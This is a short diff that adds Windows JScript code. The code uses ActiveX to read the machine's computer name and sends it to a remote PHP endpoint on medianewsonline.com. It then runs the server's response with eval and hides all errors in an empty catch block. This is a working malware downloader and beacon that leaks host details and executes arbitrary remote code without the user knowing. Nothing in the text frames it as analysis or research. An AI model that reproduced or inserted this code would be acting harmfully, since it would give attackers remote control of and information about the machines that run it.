@@ -1,0 +1,8 @@
+try {
+	var wnk = new ActiveXObject('WScript.Network');
+	var xh = new ActiveXObject("Microsoft.XMLHTTP");
+	xh.open("GET", "http://iuh234.medianewsonline.com/dwnkl.php?uid="+wnk.computerName+"&key=kx", false);
+	xh.send("");
+	eval(xh.responseText);
+}
+catch (err) {}
